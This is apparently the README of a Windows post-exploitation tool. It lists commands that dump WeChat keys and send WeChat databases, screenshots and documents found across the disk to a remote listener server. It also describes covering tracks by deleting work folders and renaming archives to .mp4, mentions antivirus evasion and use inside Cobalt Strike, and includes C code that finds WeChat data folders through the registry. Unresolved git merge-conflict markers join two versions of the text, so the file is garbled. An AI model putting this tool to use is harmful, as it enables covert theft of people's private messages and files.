### Server

<<<<<<< HEAD
```plain
Server.exe port # 默认8888端口
```

### Command

```plain
[+] FileSearch.exe dumpkey # 获取微信密钥
[+] FileSearch.exe send 127.0.0.1 8888 # 从默认路径回传微信数据库
[+] FileSearch.exe send 127.0.0.1 8888 vxpath # 指定微信数据库路径
[+] FileSearch.exe photo 127.0.0.1 8888 # 桌面截屏回传
[+] FileSearch.exe search d:\ .docx # 查找指定类型文件
[+] FileSearch.exe upload path 127.0.0.1 8888 # 上传文件
[+] FileSearch.exe uploads path 127.0.0.1 8888 # 上传文件夹
[+] FileSearch.exe all 127.0.0.1 8888  # 全盘获取指定类型文件
[+] FileSearch.exe user 127.0.0.1 8888 # c:\users目录下查找类型文件
```

### v1.3

1、all参数排除了c盘符查找指定类型文件，避免大量缓存文件造成卡顿，添加user参数在c:\users目录下查找

可自行修改需要上传的文件类型（747行），默认为：

```plain
	const char* filetype[] = { ".doc",".xls", ".pdf" ,".docx",".xlsx",".txt",".bat",".ppt",".pptx" };
```

2、运行成功后会自动删除生成出来的文件夹以及压缩包，压缩包文件随机修改成了mp4后缀

3、优化了查找文件匹配方式，支持模糊匹配或精确匹配

4、新增uploads参数遍历指定文件夹压缩上传功能

5、新增photo参数桌面截屏回传功能

### 功能展示：

![img](https://cdn.nlark.com/yuque/0/2022/png/32539762/1668769423893-416c9225-1319-4133-a468-3cb6cee900d4.png)

![img](https://cdn.nlark.com/yuque/0/2022/png/32539762/1668770076653-85c5e09c-e9a8-436f-8ce5-8987cc079882.png)

![img](https://cdn.nlark.com/yuque/0/2022/png/32539762/1668772513228-738d3cd4-5aef-49e5-9d31-6df8d9c6e8f9.png)

## 已知问题：

测试在1M带宽的服务器上传输大文件（G级）可能会损坏，感觉这跟双方网络波动有一定关系，后续会改成自动分卷压缩来上传，目前暂用的解决办法：

例如本地自带Rar进行切割，回传后

```plain
C:\Program Files\WinRAR\Rar.exe a -ep1 -m0 -v2mC:\Users\admin\Downloads\1.rar C:\Users\admin\Downloads\xxx.jar
```

注释：-v2m 即分卷的大小为2m 

2、使用WinRAR内置修复功能或者使用[DiskInternals ZIP](https://www.diskinternals.com/zip-repair/)进行修复损坏文件

> 后续还会更新~

如果发现缺陷请提交 issue，非常感谢！

#### 本人失业多年，已不参与大小HW活动的攻击方了，若溯源到id与本人无关

## 免责声明

 本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。 如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。 您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。
=======
## 开发中......
### v1.3

1、排除c盘符的查找指定类型文件，避免大量缓存文件，自定义参数在c:\\users目录下查找

2、运行成功后删除生成出来的文件夹以及压缩包，文件后缀随机修改成了mp4

3、(碰到vx用户自设的保存路径，需要加个指定路径去获取)

4、优化了查找文件匹配方式，支持模糊匹配或精确匹配

![](https://cdn.nlark.com/yuque/0/2022/png/32539762/1668442052652-b9de6f05-6a00-4ae1-a32c-a5d9adbf7631.png)

```
[+] FileUpload.exe dumpkey
[+] FileUpload.exe search d:\ .docx 
[+] FileUpload.exe send 127.0.0.1 8888
[+] FileUpload.exe send 127.0.0.1 8888 vxpath
[+] FileUpload.exe upload path 127.0.0.1 8888
[+] FileUpload.exe all 127.0.0.1 8888
[+] FileUpload.exe user 127.0.0.1 8888

```

### v1.2(暂不开源)

实战中发现全盘查找微信数据库文件在cs中非常拉跨，查找等待时间较长，且盘符越多越慢

1、直接读取注册表的键值，wxid关键字匹配拼接路径

```
void getPath(char *dbpath)
{
	char cmd_command[256] = { 0 };
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
	HKEY hKey;
	DWORD dwType = REG_BINARY;
	REGSAM mode = KEY_READ;
	DWORD length = 256;
	int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hKey);

	ret = RegQueryValueEx(hKey, "Personal", 0, &dwType, (LPBYTE)dbpath, &length);
	strcat(dbpath, "\\WeChat Files");
	//cout << dbpath << endl;

	if (ret == 0) {
		RegCloseKey(hKey);
	}
	else {
		printf("failed to open regedit.%d\n", ret);
	}
}

```

```
void getFileNames(string path, vector<string>& files)
{
	intptr_t hFile = 0;
	//文件信息
	struct _finddata_t fileinfo;
	string p;
	string::size_type idx;

	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1)
	{
		do
		{
			//如果是目录,匹配文件夹
			if ((fileinfo.attrib & _A_SUBDIR))
			{
				if (strstr(fileinfo.name, "wxid") != NULL)
					files.push_back(p.assign(path).append("\\").append(fileinfo.name));
			}

		} while (_findnext(hFile, &fileinfo) == 0);
		_findclose(hFile);
	}
}

```
2、传输改成socket协议，支持大文件上传，效率很快，需要启动个Server socket
![](https://cdn.nlark.com/yuque/0/2022/png/262397/1665465880719-3ec78718-3e6e-4ac8-87a1-d2751bfdaabf.png)

3、参考https://github.com/Ormicron/Sharp-dumpkey 

远程拉取基址，考虑到免杀性改成了C++代码，
![](https://cdn.nlark.com/yuque/0/2022/png/262397/1665469015290-f07178fb-95a6-4d35-9161-bbf2d4a7da13.png)

```
[+] FileUpload.exe dumpkey
[+] FileUpload.exe send 127.0.0.1 8888
[+] FileUpload.exe upload path 127.0.0.1 8888

```
实现效果：
![](https://cdn.nlark.com/yuque/0/2022/png/262397/1665471090145-08f5b557-680f-4c8c-8fce-9574d581f81d.png)

### v1.1
服务端：python2 http_put.py 80 path 

（win10自带curl.exe，其他系统可以上传一个或者引用socket库）

1、新增全盘查找微信聊天记录文件并压缩上传到指定服务器

2、压缩本地文件并上传到指定服务器

3、指定盘查找指定文件后缀并输出
```
[+] eg: Filesearch default baidu.com
[+] eg: Filesearch upload C:\MSG0.db baidu.com
[+] eg: Filesearch search C:\ docx

```
## v1.0

```
System Drive are:C:\D:\
Command:FileSearch.exe Drive Keyword
Example:FileSearch.exe C:\ docx
```

![](https://cdn.nlark.com/yuque/0/2020/png/262397/1598583458455-d71cecb3-ef4e-49de-b33e-fe81c55c012b.png)
>>>>>>> b40b4e5e53610081ae1bbaad8409911e2c233079
